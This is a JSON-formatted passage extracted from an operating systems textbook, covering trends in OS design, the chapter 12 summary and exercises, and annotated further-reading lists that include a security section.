            "content": "12.6.1 Virtualization and the Cloud\r\nVirtualization is an idea whose time has definitely come—again. It first sur\u0002faced in 1967 with the IBM CP/CMS system, but now it is back in full force on the\r\nx86 platform. Many computers are now running hypervisors on the bare hardware,\r\nas illustrated in Fig. 12-12. The hypervisor creates a number of virtual machines,\r\neach with its own operating system. This phenomenon was discussed in Chap. 7\r\nand appears to be the wav e of the future. Nowadays, many companies are taking\r\nthe idea further by virtualizing other resources also. For instance, there is much in\u0002terest in virtualizing the control of network equipment, even going so far as run\u0002ning the control of their networks in the cloud also. In addition, vendors and re\u0002searchers constantly work on making hypervisors better for some notion of better:\r\nsmaller, faster, or with provable isolation properties.\r\nHardware\r\nHypervisor\r\nWindows Linux Linux Other\r\nOS\r\nVirtual machine\r\nFigure 12-12. A hypervisor running four virtual machines."
          },
          "12.6.2 Manycore Chips": {
            "page": 1054,
            "content": "12.6.2 Manycore Chips\r\nThere used to be a time that memory was so scarce that a programmer knew\r\nev ery byte in person and celebrated its birthday. Now aways, programmers rarely\r\nworry about wasting a few meg abytes here and there. For most applications, mem\u0002ory is no longer a scarce resource. What will happen when cores become equally\r\nplentiful? Phrased differently, as manufacturers are putting more and more cores\r\non a die, what happens if there are so many that a programmers stops worrying\r\nabout wasting a few cores here and there?\r\nManycore chips are here already, but the operating systems for them do not use\r\nthem well. In fact, stock operating systems often do not even scale beyond a few\r\ndozens of cores and developers are constantly struggling to remove all the bottle\u0002necks that limit scalability.\n1024 OPERATING SYSTEM DESIGN CHAP. 12\r\nOne obvious question is: what do you do with all the cores? If you run a popu\u0002lar server handling many thousands of client requests per second, the answer may\r\nbe relatively simple. For instance, you may decide to dedicate a core to each re\u0002quest. Assuming you do not run into locking issues too much, this may work. But\r\nwhat do we do with all those cores on tablets?\r\nAnother question is: what sort of cores do we want? Deeply pipelined, super\u0002scalar cores with fancy out-of-order and speculative execution at high clock rates\r\nmay be great for sequential code, but not for your energy bill. They also do not\r\nhelp much if your job exhibits a lot of parallelism. Many applications are better\r\noff with smaller and simpler cores, if they get more of them. Some experts argue\r\nfor heterogeneous multicores, but the questions remain the same: what cores, how\r\nmany, and at what speeds? And we have not even begun to mention the issue of\r\nrunning an operating system and all of its applications. Will the operating system\r\nrun on all cores or only some? Will there be one or more network stacks? How\r\nmuch sharing is needed? Do we dedicate certain cores to specific operating system\r\nfunctions (like the network or storage stack)? If so, do we replicate such functions\r\nfor better scalability?\r\nExploring many different directions, the operating system world is currently\r\ntrying to formulate answers to these questions. While researchers may disagree on\r\nthe answers, most of them agree on one thing: these are exciting times for systems\r\nresearch!"
          },
          "12.6.3 Large-Address-Space Operating Systems": {
            "page": 1055,
            "content": "12.6.3 Large-Address-Space Operating Systems\r\nAs machines move from 32-bit address spaces to 64-bit address spaces, major\r\nshifts in operating system design become possible. A 32-bit address space is not\r\nreally that big. If you tried to divide up 232 bytes by giving everybody on earth his\r\nor her own byte, there would not be enough bytes to go around. In contrast, 264 is\r\nabout 2 × 1019. Now everybody gets a personal 3-GB chunk.\r\nWhat could we do with an address space of 2 × 1019 bytes? For starters, we\r\ncould eliminate the file-system concept. Instead, all files could be conceptually\r\nheld in (virtual) memory all the time. After all, there is enough room in there for\r\nover 1 billion full-length movies, each compressed to 4 GB.\r\nAnother possible use is a persistent object store. Objects could be created in\r\nthe address space and kept there until all references to them were gone, at which\r\ntime they would be automatically deleted. Such objects would be persistent in the\r\naddress space, even over shutdowns and reboots of the computer. With a 64-bit ad\u0002dress space, objects could be created at a rate of 100 MB/sec for 5000 years before\r\nwe ran out of address space. Of course, to actually store this amount of data, a lot\r\nof disk storage would be needed for the paging traffic, but for the first time in his\u0002tory, the limiting factor would be disk storage, not address space.\r\nWith large numbers of objects in the address space, it becomes interesting to\r\nallow multiple processes to run in the same address space at the same time, to\nSEC. 12.6 TRENDS IN OPERATING SYSTEM DESIGN 1025\r\nshare the objects in a general way. Such a design would clearly lead to very dif\u0002ferent operating systems than we now hav e.\r\nAnother operating system issue that will have to be rethought with 64-bit ad\u0002dresses is virtual memory. With 264 bytes of virtual address space and 8-KB pages\r\nwe have 251 pages. Conventional page tables do not scale well to this size, so\r\nsomething else is needed. Inverted page tables are a possibility, but other ideas\r\nhave been proposed as well (Talluri et al., 1995). In any event there is plenty of\r\nroom for new research on 64-bit operating systems."
          },
          "12.6.4 Seamless Data Access": {
            "page": 1056,
            "content": "12.6.4 Seamless Data Access\r\nEver since the dawn of computing, there has been a strong distinction between\r\nthis machine and that machine. If the data was on this machine, you could not ac\u0002cess it from that machine, unless you explicitly transferred it first. Similarly, even\r\nif you had the data, you could not use it unless you had the right software installed.\r\nThis model is changing.\r\nNowadays, users expect much of the data to be accessible from anywhere at\r\nany time. Typically, this is accomplished by storing the data in the cloud using stor\u0002age services like Dropbox, GoogleDrive, iCloud, and SkyDrive. All files stored\r\nthere can be accessed from any device that has a network connection. Moreover,\r\nthe programs to access the data often reside in the cloud too, so you do not even\r\nhave to hav e all the programs installed either. It allows people to read and modify\r\nword-processor files, spreadsheets, and presentations using a smartphone on the\r\ntoilet. This is generally regarded as progress.\r\nTo make this happen seamlessly is tricky and requires a lot of clever systems’\r\nsolutions under the hood. For instance, what to do if there is no network con\u0002nection? Clearly, you do not want to stop people from working. Of course, you\r\ncould buffer changes locally and update the master document when the connection\r\nwas re-established, but what if multiple devices have made conflicting changes?\r\nThis is a very common problem if multiple users share data, but it could even hap\u0002pen with a single user. Moreover, if the file is large, you do not want to wait a long\r\ntime until you can access it. Caching, preloading and synchronization are key is\u0002sues here. Current operating systems deal with merging multiple machines in a\r\nseamful way (assuming that ‘‘seamful’’ is the opposite of ‘‘seamless’’) We can\r\nsurely do a lot better."
          },
          "12.6.5 Battery-Powered Computers": {
            "page": 1056,
            "content": "12.6.5 Battery-Powered Computers\r\nPowerful PCs with 64-bit address spaces, high-bandwidth networking, multiple\r\nprocessors, and high-quality audio and video, are now standard on desktop systems\r\nand moving rapidly into notebooks, tablets, and even smartphones. As this trend\n1026 OPERATING SYSTEM DESIGN CHAP. 12\r\ncontinues, their operating systems will have to be appreciably different from cur\u0002rent ones to handle all these demands. In addition, they must balance the power\r\nbudget and ‘‘keep cool.’’ Heat dissipation and power consumption are some of the\r\nmost important challenges even in high-end computers.\r\nHowever, an even faster growing segment of the market is battery-powered\r\ncomputers, including notebooks, tablets, $100 laptops, and smartphones. Most of\r\nthese have wireless connections to the outside world. They demand operating sys\u0002tems that are smaller, faster, more flexible, and more reliable than operating sys\u0002tems on high-end devices. Many of these devices today are based on traditional op\u0002erating systems like Linux, Windows and OS X, but with significant modification.\r\nIn addition, they frequently use a microkernel/hypervisor-based solution to manage\r\nthe radio stack.\r\nThese operating systems have to handle fully connected (i.e., wired), weakly\r\nconnected (i.e., wireless), and disconnected operation, including data hoarding be\u0002fore going offline and consistency resolution when going back online, better than\r\ncurrent systems. In the future, they will also have to handle the problems of mobil\u0002ity better than current systems (e.g., find a laser printer, log onto it, and send it a\r\nfile by radio). Power management, including extensive dialogs between the operat\u0002ing system and applications about how much battery power is left and how it can\r\nbe best used, will be essential. Dynamic adaptation of applications to handle the\r\nlimitations of tiny screens may become important. Finally, new input and output\r\nmodes, including handwriting and speech, may require new techniques in the oper\u0002ating system to improve the quality. It is likely that the operating system for a\r\nbattery-powered, handheld wireless, voice-operated computer will be appreciably\r\ndifferent from that of a desktop 64-bit 16-core CPU with a gigabit fiber-optic net\u0002work connection. And, of course, there will be innumerable hybrid machines with\r\ntheir own requirements."
          },
          "12.6.6 Embedded Systems": {
            "page": 1057,
            "content": "12.6.6 Embedded Systems\r\nOne final area in which new operating systems will proliferate is embedded\r\nsystems. The operating systems inside washing machines, microwave ovens, dolls,\r\nradios, MP3 players, camcorders, elevators, and pacemakers will differ from all of\r\nthe above and most likely from each other. Each one will probably be carefully\r\ntailored for its specific application, since it is unlikely anyone will ever stick a\r\nPCIe card into a pacemaker to turn it into an elevator controller. Since all embed\u0002ded systems run only a limited number of programs, known at design time, it may\r\nbe possible to make optimizations not possible in general-purpose systems.\r\nA promising idea for embedded systems is the extensible operating system\r\n(e.g., Paramecium and Exokernel). These can be made as lightweight or heavy\u0002weight as the application in question demands, but in a consistent way across ap\u0002plications. Since embedded systems will be produced by the hundreds of millions,\r\nthis will be a major market for new operating systems.\nSEC."
          }
        }
      },
      "12.7 SUMMARY": {
        "page": 1058,
        "content": "12.7 SUMMARY 1027\r\n12.7 SUMMARY\r\nDesigning an operating system starts with determining what it should do. The\r\ninterface should be simple, complete, and efficient. It should have a clear user-in\u0002terface paradigm, execution paradigm, and data paradigm.\r\nThe system should be well structured, using one of several known techniques,\r\nsuch as layering or client-server. The internal components should be orthogonal to\r\none another and clearly separate policy from mechanism. Considerable thought\r\nshould be given to issues such as static vs. dynamic data structure, naming, bind\u0002ing time, and order of implementing modules.\r\nPerformance is important, but optimizations should be chosen carefully so as\r\nnot to ruin the system’s structure. Space-time trade-offs, caching, hints, exploiting\r\nlocality, and optimizing the common case are often worth doing.\r\nWriting a system with a couple of people is different than producing a big sys\u0002tem with 300 people. In the latter case, team structure and project management\r\nplay a crucial role in the success or failure of the project.\r\nFinally, operating systems are changing to adapt to new trends and meet new\r\nchallenges. These include hypervisor-based systems, multicore systems, 64-bit ad\u0002dress spaces, handheld wireless computers, and embedded systems. There is no\r\ndoubt that the coming years will be exciting times for operating system designers.\r\nPROBLEMS\r\n1. Moore’s Law describes a phenomenon of exponential growth similar to the population\r\ngrowth of an animal species introduced into a new environment with abundant food\r\nand no natural enemies. In nature, an exponential growth curve is likely eventually to\r\nbecome a sigmoid curve with an asymptotic limit when food supplies become limiting\r\nor predators learn to take advantage of new prey. Discuss some factors that may even\u0002tually limit the rate of improvement of computer hardware.\r\n2. In Fig. 12-1, two paradigms are shown, algorithmic and event driven. For each of the\r\nfollowing kinds of programs, which of the following paradigms is likely to be easiest\r\nto use?\r\n(a) A compiler.\r\n(b) A photo-editing program.\r\n(c) A payroll program.\r\n3. Hierarchical file names always start at the top of the tree. Consider, for example, the\r\nfile name /usr/ast/books/mos2/chap-12 rather than chap-12/mos2/books/ast/usr. In\r\ncontrast, DNS names start at the bottom of the tree and work up. Is there some funda\u0002mental reason for this difference?\n1028 OPERATING SYSTEM DESIGN CHAP. 12\r\n4. Corbato´’s dictum is that the system should provide minimal mechanism. Here is a list\r\nof POSIX calls that were also present in UNIX Version 7. Which ones are redundant,\r\nthat is, could be removed with no loss of functionality because simple combinations of\r\nother ones could do the same job with about the same performance? Access, alar m,\r\nchdir, chmod, chown, chroot, close, creat, dup, exec, exit, fcntl, fork, fstat, ioctl, kill, link,\r\nlseek, mkdir, mknod, open, pause, pipe, read, stat, time, times, umask, unlink, utime,\r\nwait, and wr ite.\r\n5. Suppose that layers 3 and 4 in Fig. 12-2 were exchanged. What implications would\r\nthat have for the design of the system?\r\n6. In a microkernel-based client-server system, the microkernel just does message passing\r\nand nothing else. Is it possible for user processes to nevertheless create and use sema\u0002phores? If so, how? If not, why not?\r\n7. Careful optimization can improve system-call performance. Consider the case in which\r\none system call is made every 10 msec. The average time of a call is 2 msec. If the\r\nsystem calls can be speeded up by a factor of two, how long does a process that took\r\n10 sec to run now take?\r\n8. Operating systems often do naming at two different levels: external and internal. What\r\nare the differences between these names with respect to\r\n(a) Length?\r\n(b) Uniqueness?\r\n(c) Hierarchies?\r\n9. One way to handle tables whose size is not known in advance is to make them fixed,\r\nbut when one fills up, to replace it with a bigger one, copy the old entries over to the\r\nnew one, then release the old one. What are the advantages and disadvantages of mak\u0002ing the new one 2× the size of the original one, as compared to making it only 1.5× as\r\nbig?\r\n10. In Fig. 12-5, a flag, found, is used to tell whether the PID was located. Would it b pos\u0002sible to forget about found and just test p at the end of the loop to see whether it got to\r\nthe end or not?\r\n11. In Fig. 12-6, the differences between the x86 and the UltraSPARC are hidden by con\u0002ditional compilation. Could the same approach be used to hide the difference between\r\nx86 machines with an IDE disk as the only disk and x86 machines with a SCSI disk as\r\nthe only disk? Would it be a good idea?\r\n12. Indirection is a way of making an algorithm more flexible. Does it have any disadvan\u0002tages, and if so, what are they?\r\n13. Can reentrant procedures have private static global variables? Discuss your answer.\r\n14. The macro of Fig. 12-7(b) is clearly much more efficient than the procedure of\r\nFig. 12-7(a). One disadvantage, however, is that it is hard to read. Are there any other\r\ndisadvantages? If so, what are they?\r\n15. Suppose that we need a way of computing whether the number of bits in a 32-bit word\r\nis odd or even. Devise an algorithm for performing this computation as fast as possible.\nCHAP. 12 PROBLEMS 1029\r\nYou may use up to 256 KB of RAM for tables if need be. Write a macro to carry out\r\nyour algorithm. Extra Credit: Write a procedure to do the computation by looping\r\nover the 32 bits. Measure how many times faster your macro is than the procedure.\r\n16. In Fig. 12-8, we saw how GIF files use 8-bit values to index into a color palette. The\r\nsame idea can be used with a 16-bit-wide color palette. Under what circumstances, if\r\nany, might a 24-bit color palette be a good idea?\r\n17. One disadvantage of GIF is that the image must include the color palette, which in\u0002creases the file size. What is the minimum image size for which an 8-bit-wide color\r\npalette breaks even? Now repeat this question for a 16-bit-wide color palette.\r\n18. In the text we showed how caching path names can result in a significant speedup\r\nwhen looking up path names. Another technique that is sometimes used is having a\r\ndaemon program that opens all the files in the root directory and keeps them open per\u0002manently, in order to force their i-nodes to be in memory all the time. Does pinning the\r\ni-nodes like this improve the path lookup even more?\r\n19. Even if a remote file has not been removed since a hint was recorded, it may have been\r\nchanged since the last time it was referenced. What other information might it be use\u0002ful to record?\r\n20. Consider a system that hoards references to remote files as hints, for example as\r\n(name, remote-host, remote-name). It is possible that a remote file will quietly be re\u0002moved and then replaced. The hint may then retrieve the wrong file. How can this\r\nproblem be made less likely to occur?\r\n21. In the text it is stated that locality can often be exploited to improve performance. But\r\nconsider a case where a program reads input from one source and continuously outputs\r\nto two or more files. Can an attempt to take advantage of locality in the file system lead\r\nto a decrease in efficiency here? Is there a way around this?\r\n22. Fred Brooks claims that a programmer can write 1000 lines of debugged code per year,\r\nyet the first version of MINIX (13,000 lines of code) was produced by one person in\r\nunder three years. How do you explain this discrepancy?\r\n23. Using Brooks’ figure of 1000 lines of code per programmer per year, make an estimate\r\nof the amount of money it took to produce Windows 8. Assume that a programmer\r\ncosts $100,000 per year (including overhead, such as computers, office space, secretar\u0002ial support, and management overhead). Do you believe this answer? If not, what\r\nmight be wrong with it?\r\n24. As memory gets cheaper and cheaper, one could imagine a computer with a big bat\u0002tery-backed-up RAM instead of a hard disk. At current prices, how much would a\r\nlow-end RAM-only PC cost? Assume that a 100-GB RAM-disk is sufficient for a low\u0002end machine. Is this machine likely to be competitive?\r\n25. Name some features of a conventional operating system that are not needed in an em\u0002bedded system used inside an appliance.\r\n26. Write a procedure in C to do a double-precision addition on two giv en parameters.\r\nWrite the procedure using conditional compilation in such a way that it works on\r\n16-bit machines and also on 32-bit machines.\n1030 OPERATING SYSTEM DESIGN CHAP. 12\r\n27. Write programs that enter randomly generated short strings into an array and then can\r\nsearch the array for a given string using (a) a simple linear search (brute force), and (b)\r\na more sophisticated method of your choice. Recompile your programs for array sizes\r\nranging from small to as large as you can handle on your system. Evaluate the per\u0002formance of both approaches. Where is the break-even point?\r\n28. Write a program to simulate an in-memory file system.\n13\r\nREADING LIST AND BIBLIOGRAPHY\r\nIn the previous 12 chapters we have touched upon a variety of topics. This\r\nchapter is intended to aid readers interested in pursuing their study of operating\r\nsystems further. Section 13.1 is a list of suggested readings. Section 13.2 is an\r\nalphabetical bibliography of all books and articles cited in this book.\r\nIn addition to the references given below, the ACM Symposium on Operating\r\nSystems Principles (SOSP) held in odd-numbered years and the USENIX Sympo\u0002sium on Operating Systems Design and Implementation (OSDI) held in even num\u0002bered years are good sources for ongoing work on operating systems. The Eurosys\r\nConference, held annually is also a source of top-flight papers. Furthermore, the\r\njournals ACM Transactions on Computer Systems and ACM SIGOPS Operating\r\nSystems Review, often have relevant articles. Many other ACM, IEEE, and\r\nUSENIX conferences deal with specialized topics.\r\n13.1 SUGGESTIONS FOR FURTHER READING\r\nIn this section, we give some suggestions for further reading. Unlike the papers\r\ncited in the sections entitled ‘‘RESEARCH ON ...’’ in the text, which are about cur\u0002rent research, these references are mostly introductory or tutorial in nature. They\r\ncan, however, serve to present material in this book from a different perspective or\r\nwith a different emphasis.\r\n1031"
      }
    }
  },
  "13 READING LIST AND BIBLIOGRAPHY": {
    "page": 1062,
    "children": {
      "13.1 SUGGESTIONS FOR FURTHER READING": {
        "page": 1062,
        "children": {
          "13.1.1 Introduction": {
            "page": 1063,
            "content": "13.1.1 Introduction\r\nSilberschatz et al., Operating System Concepts, 9th ed.,\r\nA general textbook on operating systems. It covers processes, memory man\u0002agement, storage management, protection and security, distributed systems, and\r\nsome special-purpose systems. Two case studies are given: Linux and Windows 7.\r\nThe cover is full of dinosaurs. These are legacy animals, to empahsize that operat\u0002ing systems also carry a lot of legacy.\r\nStallings, Operating Systems, 7th ed.,\r\nStill another textbook on operating systems. It covers all the traditional topics,\r\nand also includes a small amount of material on distributed systems.\r\nStevens and Rago, Advanced Programming in the UNIX Environment\r\nThis book tells how to write C programs that use the UNIX system call inter\u0002face and the standard C library. Examples are based on the System V Release 4 and\r\nthe 4.4BSD versions of UNIX. The relationship of these implementations to\r\nPOSIX is described in detail.\r\nTanenbaum and Woodhull, Operating Systems Design and Implementation\r\nA hands-on way to learn about operating systems. This book discusses the\r\nusual principles, but in addition discusses an actual operating system, MINIX 3, in\r\ngreat detail, and contains a listing of that system as an appendix."
          },
          "13.1.2 Processes and Threads": {
            "page": 1063,
            "content": "13.1.2 Processes and Threads\r\nArpaci-Dusseau and Arpaci-Dusseau, Operating Systems: Three Easy Pieces\r\nThe entire first part of this book is dedicated to virtualization of the CPU to\r\nshare it with multiple processes. What is nice about this book (besides the fact that\r\nthere is a free online version), is that it introduces not only the concepts of process\u0002ing and scheduling techniques, but also the APIs and systems calls like fork and\r\nexec in some detail.\r\nAndrews and Schneider, ‘‘Concepts and Notations for Concurrent Programming’’\r\nA tutorial and survey of processes and interprocess communication, including\r\nbusy waiting, semaphores, monitors, message passing, and other techniques. The\r\narticle also shows how these concepts are embedded in various programming lan\u0002guages. The article is old, but it has stood the test of time very well.\r\nBen-Ari, Principles of Concurrent Programming\r\nThis little book is entirely devoted to the problems of interprocess communica\u0002tion. There are chapters on mutual exclusion, semaphores, monitors, and the dining\r\nphilosophers problem, among others. It, too, has stood up very well over the years.\nSEC. 13.1 SUGGESTIONS FOR FURTHER READING 1033\r\nZhuravlev et al., ‘‘Survey of Scheduling Techniques for Addressing Shared\r\nResources in Multicore Processors’’\r\nMulticore systems have started to dominate the field of general-purpose com\u0002puting world. One of the most important challenges is shared resource contention.\r\nIn this survey, the authors present different scheduling techniques for handling\r\nsuch contention.\r\nSilberschatz et al., Operating System Concepts, 9th ed.,\r\nChapters 3 through 6 cover processes and interprocess communication, includ\u0002ing scheduling, critical sections, semaphores, monitors, and classical interprocess\r\ncommunication problems.\r\nStratton et al., ‘‘Algorithm and Data Optimization Techniques for Scaling to Mas\u0002sively Threaded Systems’’\r\nProgramming a system with half a dozen threads is hard enough. But what\r\nhappens when you have thousands of them? To say it gets tricky is to put it mildly.\r\nThis article talks about approaches that are being taken."
          },
          "13.1.3 Memory Management": {
            "page": 1064,
            "content": "13.1.3 Memory Management\r\nDenning, ‘‘Virtual Memory’’\r\nA classic paper on many aspects of virtual memory. Peter Denning was one of\r\nthe pioneers in this field, and was the inventor of the working-set concept.\r\nDenning, ‘‘Working Sets Past and Present’’\r\nA good overview of numerous memory management and paging algorithms.\r\nA comprehensive bibliography is included. Although many of the papers are old,\r\nthe principles really have not changed at all.\r\nKnuth, The Art of Computer Programming, Vol. 1\r\nFirst fit, best fit, and other memory management algorithms are discussed and\r\ncompared in this book.\r\nArpaci-Dusseau and Arpaci-Dusseaum ‘‘Operating Systems: Three Easy Pieces’’\r\nThis book has a rich section on virtual memory in Chapters 12 to 23 and\r\nincludes a nice overview of page replacement policies."
          },
          "13.1.4 File Systems": {
            "page": 1064,
            "content": "13.1.4 File Systems\r\nMcKusick et al., ‘‘A Fast File System for UNIX’’\r\nThe UNIX file system was completely redone for 4.2 BSD. This paper\r\ndescribes the design of the new file system, with emphasis on its performance.\n1034 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nSilberschatz et al., Operating System Concepts, 9th ed.,\r\nChapters 10–12 are about storage hardware and file systems. They cover file\r\noperations, interfaces, access methods, directories, and implementation, among\r\nother topics.\r\nStallings, Operating Systems, 7th ed.,\r\nChapter 12 contains a fair amount of material about file systems and little bit\r\nabout their security.\r\nCornwell, ‘‘Anatomy of a Solid-state Drive‘‘\r\nIf you are interested in solid state drives, Michael Cornwell’s introduction is a\r\ngood starting point. In particular, the author succinctly describes the way in way\r\ntraditional hard drives and SSDs differ."
          },
          "13.1.5 Input/Output": {
            "page": 1065,
            "content": "13.1.5 Input/Output\r\nGeist and Daniel, ‘‘A Continuum of Disk Scheduling Algorithms’’\r\nA generalized disk-arm scheduling algorithm is presented. Extensive simula\u0002tion and experimental results are given.\r\nScheible, ‘‘A Survey of Storage Options’’\r\nThere are many ways to store bits these days: DRAM, SRAM, SDRAM, flash\r\nmemory, hard disk, floppy disk, CD-ROM, DVD, and tape, to name a few. In this\r\narticle, the various technologies are surveyed and their strengths and weaknesses\r\nhighlighted.\r\nStan and Skadron, ‘‘Power-Aware Computing’’\r\nUntil someone manages to get Moore’s Law to apply to batteries, energy usage\r\nis going to continue to be a major issue in mobile devices. Power and heat are so\r\ncritical these days that operating systems are aware of the CPU temperature and\r\nadapt their behavior to it. This article surveys some of the issues and serves as an\r\nintroduction to fiv e other articles in this special issue of Computer on power-aware\r\ncomputing.\r\nSwanson and Caulfield, ‘‘Refactor, Reduce, Recycle: Restructuring the I/O Stack\r\nfor the Future of Storage’’\r\nDisks exist for two reasons: when power is turned off, RAM loses its contents.\r\nAlso, disks are very big. But suppose RAM did not lose its contents when pow\u0002ered off? How would that change the I/O stack? Nonvolatile memory is here and\r\nthis article looks at how it changes systems.\r\nIon, ‘‘From Touch Displays to the Surface: A Brief History of Touchscreen Tech\u0002nology,’’\nSEC. 13.1 SUGGESTIONS FOR FURTHER READING 1035\r\nTouch screens have become ubiquitous in a short time span. This article traces\r\nthe history of the touch screen through history with easy-to-understand explana\u0002tions and nice vintage pictures and videos. Fascinating stuff!\r\nWalker and Cragon, ‘‘Interrupt Processing in Concurrent Processors’’\r\nImplementing precise interrupts on superscalar computers is a challenging\r\nactivity. The trick is to serialize the state and do it quickly. A number of the design\r\nissues and trade-offs are discussed here."
          },
          "13.1.6 Deadlocks": {
            "page": 1066,
            "content": "13.1.6 Deadlocks\r\nCoffman et al., ‘‘System Deadlocks’’\r\nA short introduction to deadlocks, what causes them, and how they can be pre\u0002vented or detected.\r\nHolt, ‘‘Some Deadlock Properties of Computer Systems’’\r\nA discussion of deadlocks. Holt introduces a directed graph model that can be\r\nused to analyze some deadlock situations.\r\nIsloor and Marsland, ‘‘The Deadlock Problem: An Overview’’\r\nA tutorial on deadlocks, with special emphasis on database systems. A variety\r\nof models and algorithms are covered.\r\nLevine, ‘‘Defining Deadlock’’\r\nIn Chap. 6 of this book, we focused on resource deadlocks and barely touched\r\non other kinds. This short paper points out that in the literature, various definitions\r\nhave been used, differing in subtle ways. The author then looks at communication,\r\nscheduling, and interleaved deadlocks and comes up with a new model that tries to\r\ncover all of them.\r\nShub, ‘‘A Unified Treatment of Deadlock’’\r\nThis short tutorial summarizes the causes and solutions to deadlocks and sug\u0002gests what to emphasize when teaching it to students."
          },
          "13.1.7 Virtualization and the Cloud": {
            "page": 1066,
            "content": "13.1.7 Virtualization and the Cloud\r\nPortnoy, ‘‘Virtualization Essentials’’\r\nA gentle introduction to virtualization. It covers the context (including the rela\u0002tion between virtualization and the cloud), and covers a variety of solutions (with a\r\nbit more emphasis on VMware).\r\nErl et al., Cloud Computing: Concepts, Technology & Architecture\r\nA book devoted to cloud computing in a broad sense. The authors explain in\n1036 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\ndetail what is hidden behind acronyms like IAAS, PAAS, SAAS, and similar ‘‘X’’\r\nAs A Service family members.\r\nRosenblum and Garfinkel, ‘‘Virtual Machine Monitors: Current Technology and\r\nFuture Trends’’\r\nStarting with a history of virtual machine monitors, this article then goes on to\r\ndiscuss the current state of CPU, memory, and I/O virtualization. In particular, it\r\ncovers problem areas relating to all three and how future hardware may alleviate\r\nthe problems.\r\nWhitaker et al., ‘‘Rethinking the Design of Virtual Machine Monitors’’\r\nMost computers have some bizarre and difficult to virtualize aspects. In this\r\npaper, the authors of the Denali system argue for paravirtualization, that is, chang\u0002ing the guest operating systems to avoid using the bizarre features so that they need\r\nnot be emulated."
          },
          "13.1.8 Multiple Processor Systems": {
            "page": 1067,
            "content": "13.1.8 Multiple Processor Systems\r\nAhmad, ‘‘Gigantic Clusters: Where Are They and What Are They Doing?’’\r\nTo get an idea of the state-of-the-art in large multicomputers, this is a good\r\nplace to look. It describes the idea and gives an overview of some of the larger\r\nsystems currently in operation. Given the working of Moore’s law, it is a reason\u0002able bet that the sizes mentioned here will double about every two years or so.\r\nDubois et al., ‘‘Synchronization, Coherence, and Event Ordering in Multiproces\u0002sors’’\r\nA tutorial on synchronization in shared-memory multiprocessor systems. How\u0002ev er, some of the ideas are equally applicable to single-processor and distributed\r\nmemory systems as well.\r\nGeer, ‘‘For Programmers, Multicore Chips Mean Multiple Challenges’’\r\nMulticore chips are happening—whether the software folks are ready or not.\r\nAs it turns out, they are not ready, and programming these chips offers many chal\u0002lenges, from getting the right tools, to dividing up the work into little pieces, to\r\ntesting the results.\r\nKant and Mohapatra, ‘‘Internet Data Centers’’\r\nInternet data centers are massive multicomputers on steroids. They often con\u0002tain tens or hundreds of thousands of computers working on a single application.\r\nScalability, maintenance, and energy use are major issues here. This article forms\r\nan introduction to the subject and introduces four additional articles on the subject.\nSEC. 13.1 SUGGESTIONS FOR FURTHER READING 1037\r\nKumar et al., ‘‘Heterogeneous Chip Multiprocessors’’\r\nThe multicore chips used for desktop computers are symmetric—all the cores\r\nare identical. However, for some applications, heterogeneous CMPs are\r\nwidespread, with cores for computing, video decoding, audio decoding, and so on.\r\nThis paper discusses some issues related to heterogeneous CMPs.\r\nKwok and Ahmad, ‘‘Static Scheduling Algorithms for Allocating Directed Task\r\nGraphs to Multiprocessors’’\r\nOptimal job scheduling of a multicomputer or multiprocessor is possible when\r\nthe characteristics of all the jobs are known in advance. The problem is that opti\u0002mal scheduling takes too long to compute. In this paper, the authors discuss and\r\ncompare 27 known algorithms for attacking this problem in different ways.\r\nZhuravlev et al., ‘‘Survey of Scheduling Techniques for Addressing Shared\r\nResources in Multicore Processors’’\r\nAs mentioned earlier, one of the most important challenges in multiprocessor\r\nsystems is shared resource contention. This survey presents different scheduling\r\ntechniques for handling such contention."
          },
          "13.1.9 Security": {
            "page": 1068,
            "content": "13.1.9 Security\r\nAnderson, Security Engineering, 2nd Edition\r\nA wonderful book that explains very clearly how to build dependable and\r\nsecure systems by one of the best-known researchers in the field. Not only is this a\r\nfascinating look at many aspects of security (including techniques, applications,\r\nand organizational issues), it is also freely available online. No excuse for not read\u0002ing it.\r\nVan der Veen et al., ‘‘Memory Errors: the Past, the Present, and the Future’’\r\nA historical view on memory errors (including buffer overflows, format string\r\nattacks, dangling pointers, and many others) that includes attacks and defenses,\r\nattacks that evade those defenses, new defenses that stop the attacks that evaded the\r\nearlier defenses, and ..., well, anyway, you get the idea. The authors show that\r\ndespite their old age and the rise of other types of attack, memory errors remain an\r\nextremely important attack vector. Moreover, they argue that this situation is not\r\nlikely to change any time soon.\r\nBratus, ‘‘What Hackers Learn That the Rest of Us Don’t’’\r\nWhat makes hackers different? What do they care about that regular program\u0002mers do not? Do they hav e different attitudes toward APIs? Are corner cases\r\nimportant? Curious? Read it.\n1038 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nBratus et al., ‘‘From Buffer Overflows to Weird Machines and Theory of Computa\u0002tion’’\r\nConnecting the humble buffer overflow to Alan Turing. The authors show that\r\nhackers program vulnerable programs like weird machines with strange-looking\r\ninstruction sets. In doing so, they come full circle to Turing’s seminal research on\r\n‘‘What is computable?’’\r\nDenning, Information Warfare and Security\r\nInformation has become a weapon of war, both military and corporate. The\r\nparticipants try not only to attack the other side’s information systems, but to safe\u0002guard their own, too. In this fascinating book, the author covers every conceivable\r\ntopic relating to offensive and defensive strategy, from data diddling to packet snif\u0002fers. A must read for anyone seriously interested in computer security.\r\nFord and Allen, ‘‘How Not to Be Seen’’\r\nViruses, spyware, rootkits, and digital rights management systems all have a\r\ngreat interest in hiding things. This article provides a brief introduction to stealth in\r\nits various forms.\r\nHafner and Markoff, Cyberpunk\r\nThree compelling tales of young hackers breaking into computers around the\r\nworld are told here by the New York Times computer reporter who broke the Inter\u0002net worm story (Markoff).\r\nJohnson and Jajodia, ‘‘Exploring Steganography: Seeing the Unseen’’\r\nSteganography has a long history, going back to the days when the writer\r\nwould shave the head of a messenger, tattoo a message on the shaved head, and\r\nsend him off after the hair grew back. Although current techniques are often hairy,\r\nthey are also digital and have lower latency. For a thorough introduction to the\r\nsubject as currently practiced, this paper is the place to start.\r\nLudwig, ‘‘The Little Black Book of Email Viruses’’\r\nIf you want to write antivirus software and need to understand how viruses\r\nwork down to the bit level, this is the book for you. Every kind of virus is dis\u0002cussed at length and actual code for many of them is supplied as well. A thorough\r\nknowledge of programming the x86 in assembly language is a must, however.\r\nMead, ‘‘Who is Liable for Insecure Systems?’’\r\nAlthough most work on computer security approaches it from a technical per\u0002spective, that is not the only one. Suppose software vendors were legally liable for\r\nthe damages caused by their faulty software. Chances are security would get a lot\r\nmore attention from vendors than it does now? Intrigued by this idea? Read 